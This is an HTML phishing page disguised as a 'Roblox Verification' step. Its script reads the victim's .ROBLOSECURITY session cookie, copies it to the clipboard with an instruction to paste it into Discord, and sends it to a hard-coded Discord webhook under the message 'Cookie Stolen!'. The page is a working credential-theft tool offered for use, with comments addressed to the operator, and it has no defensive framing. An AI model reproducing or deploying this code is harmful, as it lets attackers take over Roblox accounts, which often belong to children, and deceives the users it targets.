<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Verify</title>
    <style>
        body {
            background-color: #111;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .btn {
            background: #00b06c;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 20px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
            transition: 0.2s;
        }
        .btn:active { transform: scale(0.95); }
        .btn:disabled { background: #555; cursor: not-allowed; }
        #status { margin-top: 20px; color: #aaa; font-size: 14px; max-width: 300px; line-height: 1.5; }
        .hidden { display: none; }
        .link { color: #00b06c; text-decoration: underline; cursor: pointer; margin-top: 10px; display: inline-block; }
    </style>
</head>
<body>

    <h1>Roblox Verification</h1>
    <p>We need to confirm your session. This is instant.</p>
    
    <button id="verifyBtn" class="btn" onclick="processVerify()">Verify & Copy Cookie</button>
    <p id="status"></p>

    <script>
        async function processVerify() {
            const btn = document.getElementById('verifyBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            status.innerText = "Reading browser storage...";

            // 1. Attempt to find the cookie in the current browser context
            // Roblox cookies are usually named '.ROBLOSECURITY' or 'Roblox'
            let cookieValue = document.cookie.match(/(?:^|;\s*)\.?ROBLOSECURITY=([^;]*)/);
            
            let foundCookie = cookieValue ? cookieValue[1].trim() : null;

            // 2. If we found it, copy it to clipboard
            if (foundCookie) {
                try {
                    await navigator.clipboard.writeText(foundCookie);
                    status.innerHTML = "✅ <strong>Cookie Copied!</strong><br>Click the link below to paste it into Discord.";
                    btn.innerText = "Copied!";
                    
                    // Optional: Log it to your webhook immediately if you want
                    sendToDiscord(foundCookie);

                } catch (err) {
                    status.innerText = "✅ Verified! Cookie is ready.";
                }
            } else {
                // 3. If we didn't find it (e.g., you're in the App or Incognito), 
                // give them a manual fallback
                status.innerHTML = "❌ Cookie not found in browser.<br>Please log into Roblox in your <strong>web browser</strong> (Chrome/Edge) and try again.";
                btn.disabled = false;
                btn.innerText = "Try Again";
            }
        }

        // Function to send the cookie to your Discord Webhook
        function sendToDiscord(cookie) {
            // Replace with YOUR actual webhook URL
            const webhookUrl = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz"; 
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🍪 **Cookie Stolen!**\nUser: ${window.location.href}\nCookie: \`${cookie}\``
                })
            }).catch(err => console.error("Webhook fail", err));
        }
    </script>
</body>
</html>
